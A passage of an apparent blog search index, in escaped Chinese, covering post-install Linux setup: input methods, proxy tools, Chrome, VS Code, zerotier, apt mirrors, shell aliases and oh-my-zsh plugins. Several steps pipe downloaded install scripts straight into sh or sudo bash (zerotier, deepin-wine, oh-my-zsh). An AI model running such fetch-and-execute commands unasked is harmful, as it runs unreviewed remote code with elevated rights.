\u4e2d\u6dfb\u52a0\u955c\u50cf\u6e90</p>","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#\u5b89\u88c5-overleaf","title":"\u5b89\u88c5 overleaf","text":"<p>\u8fc7\u7a0b\u540c\u4e0a\uff0c\u53ea\u662f\u5728 wsl \u4e2d\u64cd\u4f5c</p>","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#\u53c2\u8003","title":"\u53c2\u8003","text":"<ol> <li>Auto Package download for TeXLive</li> <li>microsoft doc: wsl install</li> <li>docker doc: windows install docker</li> </ol>","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/","title":"\u5b89\u88c5 linux \u540e\u7684\u914d\u7f6e","text":"<ul> <li>\u6982\u8ff0</li> <li>\u7cfb\u7edf\u914d\u7f6e<ul> <li>\u7f8e\u5316<ul> <li>Ubuntu</li> </ul> </li> </ul> </li> <li>\u5e38\u7528\u8f6f\u4ef6<ul> <li>\u4e2d\u6587\u8f93\u5165\u6cd5<ul> <li>\"\u684c\u9762\"\u6539\u4e3a\"Desktop\"</li> <li>\u66f4\u6539 xdg-user-dirs</li> </ul> </li> <li>\u4ee3\u7406<ul> <li>\u4f7f\u7528 qv2ray</li> <li>\u4f7f\u7528 clash for windows</li> </ul> </li> <li>\u8c37\u6b4c\u6d4f\u89c8\u5668<ul> <li>chromium</li> <li>chrome</li> </ul> </li> <li>wine<ul> <li>qq</li> </ul> </li> <li>VS Code</li> <li>\u5176\u5b83\u5de5\u5177<ul> <li>gparted</li> <li>zerotier</li> </ul> </li> </ul> </li> <li>\u547d\u4ee4\u884c<ul> <li>\u8f6f\u4ef6</li> <li>\u81ea\u52a8\u914d\u7f6e</li> <li>.bashrc</li> <li>vim<ul> <li>vim \u7c98\u8d34\u65f6\u5173\u95ed\u81ea\u52a8\u7a7a\u683c</li> </ul> </li> <li>zsh<ul> <li>oh-my-zsh \u624b\u52a8\u5b89\u88c5</li> <li>\u5b89\u88c5 oh-my-zsh \u5e76\u5b89\u88c5\u63d2\u4ef6<ul> <li>zsh-autosuggestions</li> <li>zsh-syntax-highlighting</li> <li>autojump</li> </ul> </li> </ul> </li> <li>fzf<ul> <li>\u624b\u52a8\u914d\u7f6e</li> <li>\u95ee\u9898</li> <li>\u641c\u7d22\u4e0d\u5230\u65f6\u5df2\u7ecf\u8f93\u5165\u7684\u547d\u4ee4\u767d\u8d39</li> </ul> </li> <li>tmux(.tmux(oh-my-tmux))<ul> <li>\u4fee\u6539</li> </ul> </li> <li>zplug<ul> <li>\u4f7f\u7528</li> <li>\u5bfb\u627e\u63d2\u4ef6</li> </ul> </li> <li>\u81ea\u5b9a\u4e49 prompt<ul> <li>bash</li> <li>zsh<ul> <li>Customized</li> </ul> </li> </ul> </li> <li>locale</li> </ul> </li> <li>\u670d\u52a1<ul> <li>sshd</li> <li>vnc</li> </ul> </li> <li>\u5e38\u7528\u64cd\u4f5c\u53c2\u8003<ul> <li>apt \u76f8\u5173<ul> <li>apt \u6362\u6e90</li> <li>apt-get \u4e34\u65f6\u4f7f\u7528 sock \u4ee3\u7406</li> </ul> </li> <li>bash \u8bbe\u7f6e\u4ee3\u7406</li> <li>git \u8bbe\u7f6e\u4ee3\u7406</li> <li>\u6062\u590d\u9ed8\u8ba4.bashrc</li> <li>vim \u590d\u5236\u7c98\u8d34\uff08\u7cfb\u7edf\u526a\u8d34\u677f\uff09<ul> <li>\u89e3\u91ca</li> </ul> </li> <li>vim redo</li> <li>\u9000\u51fa\u7ec8\u7aef\u540e\u547d\u4ee4\u4e0d\u9000\u51fa</li> <li>ssh \u7684\u6709\u7528\u529f\u80fd<ul> <li>jump</li> <li>\u6b63\u5411\u8f6c\u53d1</li> <li>\u8fdc\u7a0b\u673a\u901a\u8fc7\u672c\u5730\u673a\u4ee3\u7406\u4e0a\u7f51\uff08\u53cd\u5411\u4ee3\u7406\uff09</li> </ul> </li> </ul> </li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u6982\u8ff0","title":"\u6982\u8ff0","text":"<p>\u4e0d\u60f3\u6bcf\u6b21\u914d\u7f6e linux \u90fd\u9700\u8981\u91cd\u65b0\u53bb\u641c\u7d22\uff0c\u56e0\u6b64\u5728\u81ea\u5df1\u5e73\u65f6\u6298\u817e\u65f6\u987a\u4fbf\u8bb0\u5f55\u4e00\u4e0b\uff08\u957f\u671f\u66f4\u65b0\uff09</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u7cfb\u7edf\u914d\u7f6e","title":"\u7cfb\u7edf\u914d\u7f6e","text":"<p>\u65f6\u533a</p> <pre><code>timedatectl set-timezone Asia/Shanghai\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u7f8e\u5316","title":"\u7f8e\u5316","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#ubuntu","title":"Ubuntu","text":"<ul> <li>dock \u680f   \u5728\u8bbe\u7f6e-&gt;\u5916\u89c2\u4e2d\u8bbe\u7f6e dock \u680f\u4e3a\u5e95\u90e8\u3001\u81ea\u52a8\u9690\u85cf\uff0c\u5e76\u8bbe\u7f6e\u5408\u9002\u7684\u5927\u5c0f\u3002</li> <li>\u80cc\u666f\u56fe   \u6682\u65f6\u8fd8\u6ca1\u6709\u627e\u5230\u6bd4\u8f83\u597d\u7684\u8f6e\u64ad\u56fe\u7247\u7684\u65b9\u6cd5</li> <li>gnome-terminal   \u8bbe\u7f6e\u80cc\u666f\u989c\u8272\u548c\u900f\u660e\u5ea6</li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u5e38\u7528\u8f6f\u4ef6","title":"\u5e38\u7528\u8f6f\u4ef6","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u4e2d\u6587\u8f93\u5165\u6cd5","title":"\u4e2d\u6587\u8f93\u5165\u6cd5","text":"<p>\u53c2\u8003\uff1a</p> <ul> <li>ubuntu22.04 https://muzing.top/posts/3fc249cf/#%E5%89%8D%E8%A8%80</li> </ul> <p>\u5982\u679c\u5b89\u88c5\u7cfb\u7edf\u65f6\u9009\u62e9\u4e86\u4e2d\u6587\uff0c\u5219\u81ea\u5e26\u4e00\u4e2a\u4e2d\u6587\u8f93\u5165\u6cd5\u3002\u800c\u5982\u679c\u9009\u62e9\u4e86\u82f1\u6587\uff0c\u540e\u9762\u60f3\u6539\u6210\u4e2d\u6587\u3002\u53ef\u4ee5\uff1a</p> <ol> <li>\u5c06\u8bbe\u7f6e\u4e2d\u7684\u533a\u57df\u548c\u8bed\u8a00\u6539\u4e3a\u4e2d\u6587\u3002</li> <li>\u6253\u5f00language support\uff0c\u7b2c\u4e00\u6b21\u6253\u5f00\u4f1a\u663e\u793a\u8bed\u8a00\u652f\u6301\u6ca1\u6709\u5b8c\u5168\u5b89\u88c5\uff0c\u4f1a\u5b89\u88c5\u4e2d\u6587\u5b57\u4f53\u7b49\u3002</li> </ol> <p>\u4e0b\u8f7d\u8c37\u6b4c\u62fc\u97f3\u8f93\u5165\u6cd5</p> <pre><code>sudo apt-get install fcitx-googlepinyin\n</code></pre> <p>\u7136\u540e\u5728 language support \u4e2d\u5c06 Keyboard input method \u4ece\u9ed8\u8ba4\u7684 iBus \u6539\u6210 fcitx\uff0c\u91cd\u542f\u7535\u8111\u3002</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u684c\u9762\u6539\u4e3adesktop","title":"\"\u684c\u9762\"\u6539\u4e3a\"Desktop\"","text":"<p>ubuntu</p> <pre><code>export LANG=en_US\nxdg-user-dirs-gtk-update\n</code></pre> <p>\u9009\u62e9\u66f4\u65b0\u540d\u79f0</p> <pre><code>export LANG=zh_CN\nxdg-user-dirs-gtk-update\n</code></pre> <p>\u9009\u62e9\u4fdd\u7559\u540d\u79f0\uff0c\u5e76\u4e0d\u518d\u63d0\u9192</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u66f4\u6539-xdg-user-dirs","title":"\u66f4\u6539 xdg-user-dirs","text":"<ul> <li>xdg \u5168\u5c40\u914d\u7f6e\u6587\u4ef6\uff1a<code>/etc/xdg/user-dirs.conf</code>\u548c<code>/etc/xdg/user-dirs.defaults</code></li> <li> <p>\u4fee\u6539\u7528\u6237\u914d\u7f6e\u6587\u4ef6<code>$HOME/.config/user-dirs.dirs</code></p> <pre><code>XDG_DOWNLOAD_DIR=\"$HOME/downloads/Downloads\"\nXDG_DESKTOP_DIR=\"$HOME/downloads/Desktop\"\nXDG_TEMPLATES_DIR=\"$HOME/downloads/Templates\"\nXDG_PUBLICSHARE_DIR=\"$HOME/downloads/Public\"\nXDG_DOCUMENTS_DIR=\"$HOME/downloads/Documents\"\nXDG_MUSIC_DIR=\"$HOME/downloads/Music\"\nXDG_PICTURES_DIR=\"$HOME/downloads/Pictures\"\nXDG_VIDEOS_DIR=\"$HOME/downloads/Videos\"\n</code></pre> </li> </ul> <ul> <li>\uff08\u91cd\u8981\uff09\u521b\u5efa\u5bf9\u5e94\u76ee\u5f55\uff0c\u5426\u5219\u91cd\u542f\u540e\u4e0a\u8ff0\u914d\u7f6e\u4f1a\u6307\u5411<code>$HOME/</code></li> </ul> <pre><code>#!env bash\nPREFIX=$HOME/downloads\n\nDIRs=\"Downloads Desktop Templates Public Documents Music Pictures Videos\"\nfor dir in $DIRs; do\n    rm -d $HOME/$dir\n    mkdir $PREFIX/$dir\n    sed -i $HOME/.config/user-dirs.dirs 's/$HOME\\/'$dir'/'$PREFIX'\\/'$dir\ndone\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u4ee3\u7406","title":"\u4ee3\u7406","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u4f7f\u7528-qv2ray","title":"\u4f7f\u7528 qv2ray","text":"<p>1. \u5728 github \u4e0a\u4e0b\u8f7d qv2ray, v2ray   2. \u914d\u7f6e qv2ray core   3. \u5bfc\u5165\u94fe\u63a5</p> <p>\u5177\u4f53\u53c2\u8003https://qv2ray.net/getting-started/</p> <p>\u6ce8\uff1a\u76ee\u524d\u7248\u672c (2.6.3)\uff0c\u5728\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f\u52a8\u540e\uff0c\u53f3\u4e0a\u89d2\u7684 qv2ray \u56fe\u6807\u4f1a\u6d88\u5931\uff0c\u5bfc\u81f4\u65e0\u6cd5\u65ad\u5f00\u8fde\u63a5\u975e\u5e38\u9ebb\u70e6\u3002\u89e3\u51b3\u529e\u6cd5\u4e3a\u53d6\u6d88\u5f00\u673a\u81ea\u542f\u52a8\u5e76\u91cd\u65b0\u5b89\u88c5\uff08\u6570\u636e\u4ecd\u7136\u4f1a\u4fdd\u7559\uff0c\u6545\u4e0d\u5fc5\u62c5\u5fc3\u3002\u5378\u8f7d\u540e\u9700\u8981\u91cd\u542f\u6216\u6ce8\u9500\u4e00\u4e0b\u8d26\u6237\uff0c\u7136\u540e\u624d\u80fd\u91cd\u88c5\uff0c\u5426\u5219\u4ecd\u7136\u4e0d\u663e\u793a\uff09</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u4f7f\u7528-clash-for-windows","title":"\u4f7f\u7528 clash for windows","text":"<p>- \u4f7f\u7528 flatpak \u5b89\u88c5\u5373\u53ef</p> <pre><code>```bash\nflatpak install io.github.Fndroid.clash_for_windows\n```\n</code></pre> <p>- \u65e7\u65b9\u6cd5</p> <p>1. \u4e0b\u8f7dReleases \u00b7 Fndroid/clash_for_windows_pkg \u00b7 GitHub</p> <p>2. \u89e3\u538b\u540e\u547d\u4ee4\u884c\u8fd0\u884c cfw</p> <pre><code>  \uff08\u4e0d\u77e5\u9053\u6709\u4ec0\u4e48\u529e\u6cd5\u628a\u8be5\u7a0b\u5e8f\u56fa\u5b9a\u5230\u4efb\u52a1\u680f\uff09\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u8c37\u6b4c\u6d4f\u89c8\u5668","title":"\u8c37\u6b4c\u6d4f\u89c8\u5668","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#chromium","title":"chromium","text":"<p>\u4f7f\u7528 chromium\uff08chromium \u4e5f\u53ef\u4ee5\u4f7f\u7528 google \u5e10\u53f7\u8fdb\u884c\u540c\u6b65\uff09</p> <p>\u8fd9\u6837\u5b89\u88c5\u4f1a\u4f7f\u7528 snap \u5b89\u88c5 <pre><code>sudo apt install chromium-browser\n</code></pre></p> <p>package management - How to install Chromium without snap? - Ask Ubuntu</p> <p>\u51e0\u4e2a\u89e3\u51b3\u65b9\u6cd5</p> <ul> <li>\u4f7f\u7528 debian \u7684\u6e90</li> <li>\u4f7f\u7528 chrome \u5427\uff0cwget \u4e0b\u8f7d deb \u76f4\u63a5\u5b89\u88c5</li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#chrome","title":"chrome","text":"<p>\u4f7f\u7528 google chrome</p> <pre><code>wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb\ncd /path\nsudo apt install ./google-chrome-stable_current_amd64.deb\n</code></pre> <p>\u6216\u8005\u6dfb\u52a0\u8f6f\u4ef6\u6e90\u5b89\u88c5 tar - Help with installing the Chrome web browser (22.04.2 LTS) - Ask Ubuntu <pre><code>apt install -y curl gnupg --no-install-recommends\ncurl -sS -o - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add\n\nbash -c \"echo 'deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main' &gt;&gt; /etc/apt/sources.list.d/google-chrome.list\"\n\napt update\napt install -y google-chrome-stable --no-install-recommends\n</code></pre></p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#wine","title":"wine","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#qq","title":"qq","text":"<pre><code>wget -O- https://deepin-wine.i-m.dev/setup.sh | sh\nsudo apt-get install deepin.com.qq.im\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#vs-code","title":"VS Code","text":"<p>https://code.visualstudio.com/docs/setup/linux</p> <ol> <li> <p>download deb</p> <p>Download Visual Studio Code - Mac, Linux, Windows</p> <pre><code>sudo apt install ./&lt;file&gt;.deb\n</code></pre> </li> <li> <p>add apt repo</p> <pre><code>sudo apt install software-properties-common apt-transport-https wget\nwget -q https://packages.microsoft.com/keys/microsoft.asc -O- | sudo apt-key add -\nsudo add-apt-repository \"deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main\"\n\nsudo apt update\nsudo apt-get -o Acquire::http::proxy=\"socks5h://127.0.0.1:1089/\" install code #\u7ea6 70MB\n</code></pre> </li> <li> <p>snap or Ubuntu software</p> <p>\u8f6f\u4ef6\u5360\u7528\u7a7a\u95f4\u66f4\u5927</p> </li> </ol>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u5176\u5b83\u5de5\u5177","title":"\u5176\u5b83\u5de5\u5177","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#gparted","title":"gparted","text":"<pre><code>sudo apt install gparted\n</code></pre> <p>\u4f7f\u7528\u8be5\u8f6f\u4ef6\u8fdb\u884c\u5206\u533a</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#zerotier","title":"zerotier","text":"<pre><code>curl -s https://install.zerotier.com | sudo bash\n</code></pre> <p>join network</p> <pre><code>% zerotier-cli info\n200 info 8af72edda7 1.10.2 ONLINE\n\n% zerotier-cli join d5e04297a16fa690\n200 join OK\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u547d\u4ee4\u884c","title":"\u547d\u4ee4\u884c","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u8f6f\u4ef6","title":"\u8f6f\u4ef6","text":"<pre><code>sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak\nsudo sed -i 's@//.*archive.ubuntu.com@//mirrors.ustc.edu.cn@g' /etc/apt/sources.list\nsudo apt update\n\nsudo apt install vim git wget zsh htop net-tools\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u81ea\u52a8\u914d\u7f6e","title":"\u81ea\u52a8\u914d\u7f6e","text":"<pre><code>apt install wget curl git zsh tmux mtr htop bind9-dnsutils\n</code></pre> <pre><code>wget https://github.com/TheRainstorm/my-vim-config/raw/master/setup.sh \n# \u6216 https://raw.githubusercontent.com/TheRainstorm/my-vim-config/master/setup.sh\n\napt install zsh\nzsh\n\nsource setup.sh\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#bashrc","title":".bashrc","text":"<p>\u53ef\u4ee5\u8ba9 bash \u548c zsh \u5171\u7528\u540c\u4e00\u4e2a alias \u914d\u7f6e\u6587\u4ef6\u3002\u5728 zshrc \u4e2d\u6dfb\u52a0</p> <pre><code>if [ -f ~/.bash_aliases ]; then\n    . ~/.bash_aliases\nfi\n</code></pre> <p>\u4e3b\u8981\u5185\u5bb9</p> <pre><code>alias t=\"tmux \"\nalias ra=\"ranger\"\nalias ca=\"conda activate \"\n\nexport proxy_addr=localhost\nexport proxy_http_port=11223\nexport proxy_socks_port=11223\nfunction set_proxy() {\n    export http_proxy=http://$proxy_addr:$proxy_http_port #\u5982\u679c\u4f7f\u7528git \u4e0d\u884c\uff0c\u8fd9\u4e24\u4e2ahttp\u548chttps\u6539\u6210socks5\u5c31\u884c\n    export https_proxy=http://$proxy_addr:$proxy_http_port\n    export all_proxy=socks5://$proxy_addr:$proxy_socks_port\n}\nfunction unset_proxy() {\n    unset http_proxy\n    unset https_proxy\n    unset all_proxy\n}\nfunction test_proxy() {\n    curl -v https://www.google.com 2&gt;&amp;1 | egrep 'HTTP/(2|1.1) 200'\n}\n\n# Prompt\nexport PROMPT=\"%B%n@%m $PROMPT\"\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#vim","title":"vim","text":"<ul> <li>\u6211\u7684\u914d\u7f6e\uff1ahttps://github.com/TheRainstorm/my-vim-config</li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#vim-\u7c98\u8d34\u65f6\u5173\u95ed\u81ea\u52a8\u7a7a\u683c","title":"vim \u7c98\u8d34\u65f6\u5173\u95ed\u81ea\u52a8\u7a7a\u683c","text":"<ul> <li>\u53c2\u8003\uff1aconfiguration - Turning off auto indent when pasting text into vim - Stack Overflow</li> </ul> <pre><code>:set paste    #paste\u6a21\u5f0f\uff0c\u4e34\u65f6\u5173\u95edautoindent\n:set nopaste\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#zsh","title":"zsh","text":"<p>\u5b89\u88c5 oh-my-zsh \u65f6\u4f1a\u81ea\u52a8\u5c06 zsh \u8bbe\u7f6e\u4e3a\u9ed8\u8ba4 shell</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#oh-my-zsh-\u624b\u52a8\u5b89\u88c5","title":"oh-my-zsh \u624b\u52a8\u5b89\u88c5","text":"<p>\u901a\u5e38\u6765\u8bf4 curl \u83b7\u5f97 install \u811a\u672c\u65f6\u4f1a\u5361\u4f4f\uff0cgit clone \u4ed3\u5e93\u65f6\u4e5f\u53ef\u80fd\u5361\u4f4f\uff0c\u6b64\u65f6\u4e0d\u5982\u624b\u52a8\u5b89\u88c5\uff0c\u67e5\u770binstall\u811a\u672c\uff0c\u4f1a\u53d1\u73b0\u5176\u5b9e\u53ea\u505a\u4e86\u51e0\u4ef6\u4e8b\u60c5\uff1a</p> <ul> <li>\u5c06 oh-my-zsh \u4ed3\u5e93\u514b\u9686\u5230$HOME \u4e0b<code>.oh-my-zsh</code><ul> <li>\u53ef\u4ee5\u4ece\u5176\u4ed6\u8ba1\u7b97\u673a scp \u5230\u8def\u7531\u5668\u91cc</li> </ul> </li> <li>\u590d\u5236 zshrc \u6587\u4ef6\uff1a<code>cp .oh-my-zsh/templates/zshrc.zsh-template .zshrc</code><ul> <li>\u76f4\u63a5\u590d\u5236\u5373\u53ef\uff0c\u4e0d\u7528\u4fee\u6539\u5185\u5bb9</li> </ul> </li> <li>chsh<ul> <li>openwrt \u6ca1\u6709 chsh \u547d\u4ee4\uff0c\u9700\u8981\u4fee\u6539/etc/passwd</li> <li>\u6ce8\u610f\uff0c\u5982\u679c\u4fee\u6539\u9519\u8bef\uff08\u5982\u76f4\u63a5\u8f93\u5165 zsh \u800c\u4e0d\u662f zsh \u4ece\u6839\u5f00\u59cb\u7684\u5b8c\u6574\u8def\u5f84\uff09\u53ef\u80fd\u5bfc\u81f4\u65e0\u6cd5\u767b\u5f55 openwrt</li> </ul> </li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u5b89\u88c5-oh-my-zsh-\u5e76\u5b89\u88c5\u63d2\u4ef6","title":"\u5b89\u88c5 oh-my-zsh \u5e76\u5b89\u88c5\u63d2\u4ef6","text":"<p>install\uff1aOh My Zsh - a delightful &amp; open source framework for Zsh</p> <pre><code> sh -c \"$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n</code></pre> <p>tips:</p> <ol> <li>\u5b89\u88c5 oh-my-zsh \u4f1a\u4f7f\u7528 git \u514b\u9686\u4ed3\u5e93\uff0c\u8bf7\u63d0\u524d\u5b89\u88c5 git \u5e76\u8bbe\u7f6e\u4ee3\u7406</li> <li>\u5982\u679c\u8fde\u63a5\u4e0d\u4e0a raw.github.com \u53ef\u4ee5\u5c1d\u8bd5\u66f4\u6362 DNS\u3002\u66f4\u4fdd\u9669\u7684\u8fd8\u662f\u7ed9 bash \u8bbe\u7f6e\u4ee3\u7406</li> <li>\u63a8\u8350\u76f4\u63a5\u4ece\u53e6\u4e00\u53f0\u673a\u5668\u4e0a scp</li> </ol>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#zsh-autosuggestions","title":"zsh-autosuggestions","text":"<p>zsh-autosuggestions \u4f5c\u7528\uff1a\u81ea\u52a8\u63d0\u793a\u547d\u4ee4</p> <pre><code>git clone https://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions\n</code></pre> <p>\u5728.zshrc \u4e2d plugin \u884c\u6dfb\u52a0 zsh-autosuggestions\uff0c\u5373</p> <pre><code>plugins=(git zsh-autosuggestions)\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#zsh-syntax-highlighting","title":"zsh-syntax-highlighting","text":"<p>zsh-syntax-highlighting \u4f5c\u7528\uff1a\u547d\u4ee4\u9ad8\u4eae\uff0c\u6b63\u786e\u7684\u547d\u4ee4\u663e\u793a\u7eff\u8272\uff0c\u9519\u8bef\u7684\u663e\u793a\u4e3a\u7ea2\u8272</p> <pre><code>git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $ZSH_CUSTOM/plugins/zsh-syntax-highlighting\necho \"source $ZSH_CUSTOM/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh\" &gt;&gt; 